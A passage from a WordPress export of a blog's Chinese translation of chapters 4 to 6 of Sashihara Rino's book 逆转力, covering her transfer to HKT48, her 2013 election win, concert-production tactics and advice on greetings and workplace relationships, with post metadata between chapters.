我破坏了48G的规矩，正在思考应该做些什么才能得到48G粉丝们的谅解，那自然是能为48G整体做出贡献。移籍到刚刚开始活动不久的HKT48组合中，使其热闹起来，通过这些让整个48G热闹起来，这会成为最好的<strong>[贡献]</strong>。
<strong>[得到第4名的这一年如果平静的生活下去，指原的人气也不会再增加，但移籍到HKT48努力再努力，我想没有比这再有趣的事情哦。]</strong> 说不定现在我自身的状况并不是危机，也许是机遇。也就是说，现在是一个机遇啊，我只这么想。
<strong>转换心情</strong>
一觉醒来，第二天已经完全调整好了心情。
也许容易招致误解，并不是没有反省，只是能够特别迅速恢复元气。
我可是很善于寻找幸运的哦。
如果拼命去找寻属于自己幸运，我想在哪都可以寻找的到。
最初移籍到HKT48的时候，我也曾失落过。但是在AKB48的时间里惊喜不断，身心已得到锻炼。就算感觉厌烦，厌烦，决定了的事情不会改变。所以厌烦只是浪费时间。寻找幸运会更好。
<strong>[博多的美味有很多很多哦] [可以积攒许多飞机的里程卷哦] [说不定妈妈她们也会来看演唱会啊]</strong> 也有过这样的想象。
<strong>[比起就这样在AKB48里面呆着，不是会有更多让自己成长的刺激与邂逅吗]</strong> 我想我是赚了啊。
危机的时候转换心情，向着前方会更容易找到幸运。我想找寻到幸运之后，现实中做起事来会变得容易。
<strong>不要吐露消极</strong>
HKT48移籍之后，初次和成员一起的剧场公演日被决定下来，2012年7月5日。
不仅还有别的工作，练习的时间也受到限制。演出当日临近的时候，我告知经纪人<strong> [公演结束为止的时间，想全部安排进彩排。我不想做‘现在是怎样的心情？’这样的见面会]</strong> 。
<strong>[正在反省]</strong> 这样的事情，我想我已经不想再度阐述。其实反省这件事别人也无法看到，自己也很难传达。我想用更直白的形式<strong> [指原莉乃作为HKT48的成员再努力再努力！]</strong> ，我想我只有在舞台上证明我自己。而且被问到<strong> [从现在正式开始吗，感觉如何？]</strong>， 我只能回答 <strong>[为了能够让大家接受，我会好好努力]</strong> 。
只能低头回答。
关于公演初日，比起清楚明白该做什么的自己，我想也许粉丝们会有更多的不安。正是因为这样，如果我给大家表现出了沮丧的一面，粉丝们会更加担心。
结束之后的见面会上，我昂起头说，<strong>[完成的非常爽快，之后我会继续努力！]</strong> 我把积极向上的一面展示给了大家。
消极的事情，我想最好不要传达给别人，如果周围的气氛变得消极，那么这种气氛也会影响到你自己。
<strong>消极的时候不要上网</strong>
那个时候我感觉指原做的好的事情是，完全远离网络。
2CH自然，综合网站也完全不看。
记事刊登之后，在网络上看了这些会产生<strong> [自己做了坏事]</strong> 的消极心情，我想这只会让自己情绪低落。很容易想象到，留言肯定会是至今为止关于我最恶劣的话语。但是，眼不见为净哦。艰苦的时候，为了让自己恢复精神，有许多人会去网络寻找正能量的话语。越是艰苦的时候，越容易受到负能量的影响。消极的时候看到了消极的东西，只会让消极情绪蔓延。
所以，我决定，绝对不看网络的消息，真的没有看过一次。我想我是对的。
因为大家接受了我剧场公演初日落幕。
那个时候，那个时候留在我心里的只有快乐与动力。消极要素为0。
说实话，决定移籍HKT48之后的这样那样种种事情，我只记得开心的部分。
果然在最早的时候，HKT48成员心里也会动摇，我想也是自然。一直以来都是和同期成员进行活动的组合，突然间有前辈加入，想想都会惊讶。
虽然我想这完全没有问题，但咪酱对我说<strong> [对于HKT48的成员来说，也许感觉我就像是（篠田）麻里子那样的前辈]</strong> 。也许确实这样，说实话，我也曾深感不安。
但是，HKT48的成员们大家都很年轻，好的意义上都是孩子。阳光，精力充沛，单纯哟。
大家如同迎接<strong> [东京来的转校生]</strong> 一样迎接我。她们开始主动联系我的哦，如果是其他的姐妹组合，我想也许就是另一番景象了。
对九州的大家表示感谢，可以接受我。公演初日的时候，有好多人对我喊<strong> [欢迎] [欢迎回家]</strong> 。因为我是大分出身，我想到会有 <strong>[欢迎]</strong> 这样的话语，但<strong> [欢迎回家]</strong> 真的很新鲜，很开心。
公演初日演出结束之后，福冈电视剧的工作也即将开始，大家真的对我好温柔哦。
正是因为大家可以接受我，我要<strong> [在这里，我要尽我最大的可能]</strong> 这种感觉不知不觉涌上心头。
<strong>与最大危机相伴相随的是最高机遇</strong>
2013年6月8日。我迎来了移籍之后的总选举。
我的目标是第4位。只要能维持住上一回的结果，我想是不是表示大家可以接受我认同我呢。
第一名。
15万570票。
过渡惊异到无法呼吸，而且是那么多票。
作为第一名被叫到名字，为做演讲登上舞台的时候，舞台上看到的风景和呼喊声至今依然鲜明的呈现在在脑海之中。
呼喊声中有很大的比重是 <strong>[为什么是指原---!]</strong> 这样的吵闹声。但是，就算包含这些，我这个20岁并不可爱的少女让7万人为我而动。
中学3年级的时候，为了摆脱自己生活的小城，走上成为偶像的道路。现在的状况，是我那个时候完全没办法想象的。
一张张的选票，能感受到大家应援的呼喊。<strong>[再试着好好努力一回！]</strong> 我感觉自己得到了这么一个机会。
握手会的时候，<strong>[小指原为了HKT48努力的姿态我们都看到了，我会投一票的]</strong> 这样对我说的粉丝很多很多。为了应援我的大家，我只有更加更加的对HTK48做出自己的 [贡献] 。从博多开始，我想让48G更加更加的繁荣起来。
第一位之后，再一次由心中像这样想。
<strong>变的更强</strong>
正是因为移籍到HKT48，我想我的内心相比过去变得格外强大。
或者说，我没有退路只能让自己变强。
因为我在HKT之中年龄最大，又是作为前辈，我的存在必须能够指引大家。我不好好的去做，这个组合也不能好好的完成，慢慢开始这样想。作为偶像这样不好吧。不靠谱的成员会显得可爱，因为不够强所以大家回去应援不是吗。我也是通过<strong> [废柴] [完全不行]</strong> 而拥有人气的类型。我更加这样认为。
但是，因为软弱的地方我已经不会再展现了，我已经不是废柴了。从现在开始，只能作为强者去活下去。
现在开始，我想用这份坚强让大家感到有趣。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>860</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 22:22:49]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 14:22:49]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e5%9b%9b%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[257]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 第五章</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%ba%94%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 15:03:01 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=862</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 24pt;">第5章    为了“大家胜利”的战术——指原流制作术</span></strong>
&nbsp;
回过神的时候，已经成为了HKT48的剧场支配人。
2013年4月28日在日本武道馆惊喜发表中被告知这件事情，<strong>[成员兼任剧场支配人在组合中还是第一次！]</strong> 我想当然是这样。
在外界看来这可能是很大的变动，虽然大家也以支配人来称呼我，但我做的事情并没有太多改变。听听后辈的烦恼并给与建议，将成员认为重要的意见反应给领导层，关于业务细节的事情，尾崎先生(HKT48剧场支配人 尾崎充）具体去做，他是个温和的大叔。
成为支配人之后可以去完成的事情之一是演唱会的歌曲顺序编排。其实虽然在成为支配人之前也一直在做，只是现在提建议时已经没有必要再说<strong> [作为成员有些话很难去说.....]</strong> 。
孩子的时候，作为“现场宅”，对于非常喜爱观看偶像舞台演出的我来说，演唱会是特别的存在。对于我来说是最重要的工作场所。在这一章中，由HKT48演唱会制作为原点，关于人或者组合的制作方法，我想讲述一些我自己的想法。
无论如何，HKT48这个48G组合的小妹妹，一直处在追赶姐姐的立场。这正是可以发挥“逆转力”的绝佳环境。<!--more-->
<strong>指原制作流4原则</strong>
在前面章节说过的，48G在国内就拥有4支姐妹组合。根据组合成立时间，首先是以秋叶原为专用剧场进行活动的AKB48。接着是名古屋为据点的SKE48，大阪难波为据点的NMB48组合，最后是福冈博多为据点的HKT48组合。
AKB48组合整体演出品质很高。同时拥有很多人气成员，作为一个团体也闪耀着光芒。SKE48则胜在完美帅气的舞蹈，NMB48果然是作为关西的组合，MC的趣味性最强。
HKT48作为组合的小妹妹，还处于发展阶段，在个个方面‘都还不行’。
如果和姐姐们做同样的事情，如不能做的更好，不仅追不上，也无法脱颖而出。
在大家一起努力向上加油的时光里，从结果中觉察到的一些事情，我好像一直在使用4个作战计划去战斗。

<ul>
    <li>转换战场在自己得意的分野战斗。</li>
    <li>用粉丝目光去思考。</li>
    <li>由成为话题的钓钩开始着手，扩散至全国。</li>
    <li><strong>[创造王牌]</strong> 和 <strong>[轮换出场]</strong> 两者兼顾</li>
</ul>

具体是什么意思呢，我想接下来一个一个详细讲述。
<strong>不要在同一个战场上战斗之一，我们自己享乐到底</strong>
HKT48无论在知名度，气质，舞蹈还是MC，与其他姐妹组合相比，品质上都要弱一些。在这里战斗的话，没有赢的可能。
但是，如果有让成员自身感觉快乐的排名，我想没有疑问可以获得第一。
自己能够感受到快乐的事情，同时也是可以让观众最容易获得快乐的方式哦。自己都感觉不到快乐，观众同样也不会感受的到。站在舞台上的心情，我想会自然而然的传达给观众。
如果我们的演出能够使观众入迷，能够让他们感受的到。比起自己乐在其中，能够让对方感受到快乐也许会更好。
但是，HKT48还没有这么强大的能力，<strong>[我们很开心！ 希望你们也能一起开心！]</strong> 只有这样前进。
HKT48作为小妹妹，年轻，充满活力是最大的特色，在很多方面都还不行，所以采用这个战术。
最近常常会想，<strong>[开朗]</strong> 很厉害。<strong>[精力充沛]</strong> 很厉害。开朗，精力充沛的将自己需要做的事情，开开心心的做好。在职场，学校如果有像这样一个孩子在身边，我想自己也会自然而然心情愉悦。
HKT48的武器在这里，我这样想的哦。
<strong>不要在同一个战场上战斗之二，选曲打破预定的和谐</strong>
HKT48在今年1月至3月举行了第一次的九州巡演（《HKT48九州7県ツアー～可愛い子には旅をさせよ～》 )。
从这开始具体以九州巡演作为例，我想要讲述这个被叫做HKT48的组合魅力与演唱会的魅力。
这次巡演，是我从头开始负责的第一场演唱会。
关于开幕演唱，歌曲之外的企划都加入了自己的想法。从自己想要做的事情第一次得以实现的意义上，我想这将成为HKT48演唱会的基本形式。啊，DVD和蓝光也在好评发售中。
我想，先从歌单开始突然做出改变。
当时，HKT48已经发行3张唱片。出道歌曲 [スキ！スキ！スキップ！] （2013年3月20日发行），[メロンジュース] （2013年9月4日发行），[桜、みんなで食べた] （2014年3月12日发行）。每一张 CD都是Type-A到TypeC和剧场盘4个类型。类型不同CD收录的B面曲目也相继不同，这样想之后，HKT48 拥有的曲目可以基本覆盖巡演。
从粉丝的角度考虑，在演唱会中听到自己熟悉的歌曲会开心吧，但是每一次都像约定一样，曲目名单都相同的话，我想结果是粉丝们也会审美疲劳。
除了铁板曲目之外，我想其他歌曲尽量避免频繁演唱。把一切作为可能，尝试更多地方的更多歌曲。原本就很喜欢偶像歌曲的我，在ipod中收藏了大量歌曲哦。
首先，重新听48G的歌曲，专辑，剧场公演曲，因为AKB48的历史最长，所以被埋没的名曲也有许多。因为知道的人很少，过去的老歌不唱的话真是一种浪费。
其他同样，SKE48，NMB48的歌曲，还有AKB48官方对手乃木坂46的曲目也都进行了筛选。候选曲目的变化突然丰富起来，下一首歌曲会是什么很难做出预想。我想就像这样，可以一直保持新鲜感在HKT48的演唱会中感受到快乐。
<strong>不要在同一个战场上战斗之三，创造 [无法对比] 的企划</strong>
作为企划核心思考的是 <strong>[HKT48最强主攻手]</strong> 。
松田圣子小姐的 <strong>[青い珊瑚礁]</strong> ，キャンディーズ组合的 <strong>[春一番] </strong>，Wink组合的 <strong>[淋しい熱带魚]</strong> ，アン・ルイス小姐的<strong> [あゝ无情]</strong> ，おニャン子クラブ组合的<strong> [セーラー服を脱がさないで]</strong>......。过去的名曲，偶像歌谣名曲，由HKT48成员翻唱企划制定。
公演曲目轮换，成员也同样轮换，我想虽然这些歌曲都是第一次演唱，但大家都好好记住并给我们带来了演出。
为什么会制作这个企划。
48G的演唱会是由全体成员参与歌曲与个别成员的单元歌曲构成。至今为止的HKT48已经演唱过 「てもでもの涙」 「雨の動物園」「禁じられた２人」「キャンディー」AKB48既存的单元歌曲。
一直都演唱同样曲目的话，会引起不满的哦。只是，如果演唱全新的歌曲，在大型演唱会演出谁也不知道歌曲风险更大。
就在这个时候，正值FNS歌谣祭。
48G也得到了演出机会，在观看其他艺术家的演唱会的时候，爱酱（多田爱佳）说<strong> [（朝长）美樱如果演唱「センチメンタル・ジャ―二―」（松本伊代），一定非常可爱啊]</strong>。
<strong>[这不是很好嘛！]</strong>就这样决定了。
我想也会有粉丝不喜欢这种形式的演唱会，年轻饭群体对老歌也不熟悉，许多粉丝想听自己喜欢的AKB48 歌曲。
但是，如果和AKB48做同样的事情，没有胜算的。和SKE48，NMB48做同样的事情，没有赢的可能。同样的歌曲，同样的规则去战斗，时间的积淀摆在那里，比较之后只会失败。
如果比较之后就会失败，那么就去做没有办法去比较的事情。
[<strong>不要在同一个战场上战斗]</strong> 用我直至以来的战术，在HKT48的演唱会中进行了尝试。
用粉丝的目光思考
成员呼喊<strong> [大家沸腾起来吗~]</strong> 在HKT48的演唱会中经常这样煽动。<strong>[总之找到机会就去煽动！]</strong> 我这样对成员说。
在舞台与观众席之间做些什么，粉丝们会沸腾起来，自己也会沸腾。<strong>[大家开心吗~] </strong>这样呼喊之后，不仅可以确认来观看演唱会的观众是不是乐在其中，而且也可以确认自己。
还有，能让坐在上面的观众沸腾起来，这种情绪会向下层蔓延，结果会与整个会场沸腾紧密相连。如果直直的看着前方，或者目光往下，那么会被看做无精打采。目光向上会把可爱精力充沛的姿态通过显示器传达给大家。
导演教给我的，这些技术秘诀。
其实，在这次九州巡演的时间点上，HKT48迎来了新的导演。
至今为止的导演对于成员来说如亲人一般，一起完成了充满爱情的演出。新的导演把很严肃的演艺界气氛带入到现场。
<strong>[你们是职业歌手，作为演唱会的回报，不要忘记你们是从观众那里赚钱的！]</strong>
此时此刻大家的心情，从眼神中就看得出变化。心里的想法也慢慢改变，希望一个人乃致更多的粉丝能够满足而归。
忍不住的开心，最想做的，最开心的，就是现在HKT48的演唱会，比起电视节目更想去做！
<strong>让世界快乐</strong>
九州巡演，开场曲目斟酌决定。
是我最喜爱的早安少女的 <strong>[ザ☆ピ～ス！] </strong>。当然并不是根据我的趣味去选择了这首歌曲。
与AKB48相比员人数要少。只在围绕九州地区的演出在某种意义上，只是一个地方性的新闻。怎么样才能制造话题呢。如果说是<strong> [48G翻唱ハロプロ的歌曲]</strong> 这种冲击力，我想会不会让世界变得热闹起来呢。
HKT48单独演唱会（<strong>[AKB48グループ春コンinさいたまスーパーアリーナ～思い出は全部ここに捨てていけ！～]</strong>（2014年4月5日）之时。秋元先生也有他的建议。<strong>[如果开幕不狠狠地做些什么，那么就赶不上第二天的新闻] </strong>。结果，在演出中HKT48全员身着体操服登场。
在开幕中放入话题素材，如果媒体方面早早拍摄好照片，那么会有比如 <strong>[HKT48竞技场初演运动会开幕]</strong> 这样新闻出现的可能性。但是正巧发生了很多狠多，虽然最后出现了这么一条新闻......<strong>[小指，没想到只有你一个人是运动短裤姿态（被俘获了）]</strong>。
HKT48前进壮大，只是让现场的观众感到快乐还远远不够，不去考虑如何让世界感受到快乐是不行的。
<strong>制作王牌，顺序轮换之一，站在中心，支持中心</strong>
Center，如字面意思，组合中站在正中心的成员。
至今为止的单曲做过中心成员有，一期生的はるっぴ（儿玉遥），2期生的田岛（芽瑠）和（朝长）美樱。
这3个人拥有偶像的才能，并且很努力，我想她们符合中心成员的位置。
但考虑到总选举的顺位，（宮脇）咲良排名会更高哦。但是，这是我尊敬的偶像前辈说过的，最人气的成员不在中间位会更好些。最人气的成员如果站在中间位，人气集中在她一身，其实这对于一个组合并不好。
我非常理解。
想站在中心的孩子有很多很多，说些现实的东西，选拔成员能站在第几排，甚至在此之前能不能进入选拔，成员之间已是擦出火花。
也许有人会认为好可怜啊，我个人的看法是，我认为组合中对成员有所偏向会更好。
突然之间对全体成员保持兴趣本来就不可能。先将几个人置于聚光灯之下，对这几个人确实产生兴趣之后，再慢慢的使其对整个组合产生兴趣。只能这样去做。
如果有成员问我<strong> [为什么让那个孩子站位中间位啊？]</strong> 我会回答<strong> [为了HKT48哦]</strong> 。<strong> [如果那个孩子沉没了，我们也会沉没。如果HKT48红不起来，自己也红不起来。现在不是为了自己，是为了HKT48而努力]</strong> 我想我会这样说。
<strong>制作王牌，顺序轮换之二，给予全员机会</strong>
首先，在实际确立王牌的同时，另一方面，我想把机会给予其他成员。
九州巡演7县分别轮换成员，如果有在成员家乡的演出，给予她solo部分的机会。这不仅与成员自身的原动力相关联，在粉丝的角度也会提高“找到了”这种可能性。
<strong>[“推”并不是会改变的东西，而是会增加的东西]</strong>
这是我在研究生的时代，剧场公演MC中说过的话语。到现在很多人评价道 <strong>[真是名言啊]</strong>。什么时候，什么场合我说过这些，完全记不起来了。我真的说过么？暂且不说这些。
<strong>[推] </strong>是<strong> [推成员]</strong> 的简称，意为最最支持的成员的偶像用语。对于粉丝来说最支持的只是一个人吧。如果喜欢上了别人则<strong> [变推]</strong> 。但是，最支持的成员不是一个人也没关系的吧？最后，无论谁都可以站在中间进行战斗，我想这才是真正强大的组合。
所以我想培养1个人以致更多人，我想要慢慢增加。
只有1个人成为第一那也是没有办法的事情。我想要HKT48的大家一起成为第一。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>862</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 23:03:01]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 15:03:01]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%ba%94%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[294]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 第六章</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e5%85%ad%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 15:32:36 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=865</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 24pt;">第六章    必要人际关系要素，气魄与客观——指原流交流术</span></strong>
&nbsp;
从别人经常这样评价我 <strong>[一直可以保持客观呢] </strong>。
我自己也是这么认为。
比如和家人聊天的时候也是边说边思考。这个事情这样说会更好吧，这样说的话对方会更开心吧。
演唱会的时候同样，只是思考在哪里怎样做才会使自己呈现在荧屏之上。感觉难以置信的心计高深。我一直都在思考，自己怎么做才能获得更多。
就是这样的我，试着思考了关于人与人的交流方法。自己一个人的力量很小，传达能力也有它的界限。正因为这样，客观正视自己的状况，并且必须快速计算。从而使之成为带动周围的强大力量，这就是“逆转力”的秘诀。<!--more-->
<strong>不能客观的看待，会成为没眼色的人</strong>
<strong>[注意周围的气氛]</strong> 呀，<strong>[注意接下来的流程]</strong> 等等。不是经常被说起吗。但是，这些东西在日常生活中不是都看不到吗。其实能看到的哦，在2CH。
在2CH的揭示板上随便发表一个热闹的话题，形形色色的人们会在现实时间中一个接一个的书写自己的看法。评论从上至下渐渐按照流程前进。
如果这个时候有一个人发表了一条和话题毫无关系的评论，比如<strong> [我喜欢谁谁，我感觉她这一点非常可爱]</strong> ，则会成为坏意义的显眼目标哦。喂，<strong>[注意点氛围啊]</strong> 。因为像这样突兀孤立的评论看过很多很多，所以自己在表达自己的想法之前，我想我养成了理解周围氛围的习惯。
如果不能客观看待，我想会成为没眼色的人哦。
简单的说，自我陶醉就是这样的状态吧。自我感觉很好 <strong>[我好可爱，我很帅气]</strong> 。但是错开一步，在他人的位置上重新去看<strong> [并不是这样哟？]</strong> 。
但是太过于理性也是一个问题。对于自己面前的一切，无法去忘我的投入其中哦。在心中的某个地方，一直有一个冷静看待眼前状况的自己。沉溺于网络世界之后，性格确实会有些扭曲。......现在，说的稍微好听一些。其实我绝对性格恶劣。
这段是我能将网络的经验，活用在成为偶像今天的故事，这一点不会有错。
<strong>存储好感度</strong>
如果自己可以客观看待世界，那么对于<strong> [别人是如何看待我？]</strong> 而变得敏感。
对于这样的人，打招呼则超级重要。无论多么疲倦，尽量用笑脸面对。尽量看着对方的眼睛，好好的去做。
一定不要忘记先手必胜精神。
比如在大型演唱会的时候，有很多初次见面的工作人员。演唱会结束之后要去很多房间进行致谢，<strong>[今天非常感谢]</strong>。
还有没去过的房间吗？对全体人员都说过感谢了吗？自己要在心中严谨确认。
与成员的亲人在后台将要擦肩而过之时，注意到后马上打招呼。
比起留给对方<strong> [与指原擦肩而过，好像脸色有些可怕哦]</strong> 的印象，不如<strong> [给我打招呼了]</strong> 这样绝对会更好不是么。而且这种姿态也许会被其他人看到。好印象到手。我想好感度就像是存钱，我把他悄悄的叫做<strong> [好感度存款] </strong>。
当疲倦的时候，也许会变得烦躁，也许连打招呼的力气也没有。每当这个时候，想起 <strong>[好感度存款] </strong>，努努力去把他做好。<strong>[不要在这放弃，加油去积攒！]</strong>。
当别人有怨言的时候，是好感度上升的机会。这时不是很容易随之一同抱怨吗，越是这个时候越不能这样，扮演老好人说些宽慰的话语。当然了，也没有必要为了好感度而故意去说违心的话语。
重点是，存款使用之道。
真的十分疲倦内心已经无力承受一丝一毫的时候，无意之间摆出了厌烦的态度。对稍微做错了点什么的人不是提醒，而是直接发脾气。被别人看到这种姿态就糟糕了，印象大打折扣。
这是时候，就是好感度存款发挥作用的时候了。因为有好感储存，所以对方也许会想<strong> [さっしー一直都很努力，有时候也会发点小脾气呢] </strong>。但是如果对方是完全没有好感存储的人，也许最终被认为<strong> [感觉不好的人]</strong> 。这是最差的结局了。
为了应对非常事态，所以要储存好感度。我想正因为在平时做足了功课，所以在非常事态来临的时候才可以从容应对。
十分推荐大家储存好感度。
<strong>指原流打招呼方式</strong>
关于打招呼，我还有一点思考。
我被别人说是阿谀奉承。
并不是自己认识到的哦。被别人这样说过，才注意到别人是这样看待自己的。
但是确实自己被前辈喜欢的事情很多。稍微想到的是，也许是因为自己有好好的去打招呼吧。
比如有前辈来后台的时候， 后辈们会一起说<strong> [早上好]</strong> 。就算你已经跟随大家说过了早上好，但是自己的声音不是传达不到吗。也许对方会想，<strong>[为什么指原没有打招呼呢]</strong> 。
所以，首先和大家一起说过 <strong>[早上好]</strong>，之后走近看着对方再好好的说一次<strong> [早上好]</strong>。
顺应氛围的招呼没有什么意义，也不是能让人心情愉悦的东西。从后辈对我打招呼到我自己的体验，我想确实是这样。
还有，如果有前辈演出的节目尽量观看，倒不至于专门去录像，但打开电视如果有播出尽量认真收看，之后好好的把感想传达给前辈哦。因为如果是有人对我说这些，我会非常开心的。
自己感受到开心的事情，相信对方也会感觉开心。这些和前辈后辈什么的没有关系哦。
提出建议的同时，也要快速让步继续说客观的话题。
如果可以保持客观看待，那么不只可以想到现在，而且可以一边思考将来一边与他人交流。
我是明确持有自己意见的那类人，如果有意见我会清楚的表达。但是也能够一直保持听取别人建议的态度，对方有意见也完全没有关系，常常能够保持这种心态哦。
<strong>[我是这样想的]</strong> 建议传达给对方之后，对面回答<strong> [不，我是那样想]</strong> 的瞬间，如果认为对方是正确的，马上做出让步哦。我想也会有这样的情况，感觉自己的看法说不定是正确的呢......放不下颜面左右为难之时，爽快的认同对方。做到能够马上抑制自己的情绪。
考虑到将来的事情，这样做是正确的选择。
简单轻快的让步<strong> [配合对方]</strong> 之后，结果证明我的想法才是正确的。
这时我不会对对方说些什么。只是在心中想 <strong>[看吧]</strong>。自己正确的结果，自己在心中想一想就足够了。<strong>[看吧，我才是对的]</strong> 这样说出来反倒是最坏的。不过，这种情况对方大概会给自己道歉的哦。
<strong>[果然さっしー的看法更正确啊]</strong>。
<strong>[没有没有，最后大家的看法不是都不错嘛~]</strong> 这样做之后自己的声望会提高的。
为了给对方创造一个容易道歉的环境，让步的时候早早退让会更好哦。
<strong>[算了算了，照你说的做好了]</strong>
像这样赌气说过之后，也只是会惹的对方也不开心罢了。
就算日后证明你是正确的，对方也不会对你说<strong> [对不起]</strong> 。
如果是自己做错的时候，马上去道歉。
最近，有和工作人员产生矛盾。我误解了一件关于成员的事情，并追究工作人员的责任。当得知事情来龙去脉之后，一般来说不是会对刚刚十分生气的自己感觉难为情，而敷衍说<strong> [那就好，那就好]</strong> 不是吗。
<strong>[抱歉]</strong>
这一瞬间，我却这样说。
一瞬间，情绪转换到道歉模式。
说过<strong> [抱歉]</strong> 之后，<strong>[但是.........]</strong> 有时还想说些什么不是么。
但是什么的都不需要，道歉就是单纯的道歉。
我想这样不会对以后产生影响。所以我一直都是一边考虑未来的事情，一边和别人交流。
有人会夸奖我为人坦率，我想其实自己只是善于算计的女人罢了。
<strong>企划书分两次提交</strong>
接着聊一聊我做作为支配人的工作故事。
关于HKT48的演唱会，我会从事一部分歌曲的选择工作。之外关系到金钱运用的企划还是交给伟大的大叔们做报告。
